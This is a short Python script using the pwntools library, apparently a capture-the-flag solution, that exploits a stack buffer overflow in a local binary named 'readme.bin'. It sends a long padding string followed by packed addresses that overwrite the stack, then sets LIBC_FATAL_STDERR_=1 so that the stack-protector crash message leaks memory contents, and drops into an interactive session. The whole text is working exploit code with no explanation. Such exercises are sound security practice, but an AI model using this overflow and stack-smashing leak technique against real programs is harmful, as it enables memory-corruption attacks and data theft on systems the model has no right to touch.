from pwn import *
p = process('./readme.bin')
p.recvuntil('name?')
p.sendline('a'*(0x7ffc155a87c8 - 0x7ffc155a85b0) + p64(0x400d20) + p64(0) + p64(0x600d20))
p.sendline('LIBC_FATAL_STDERR_=1')
p.interactive()
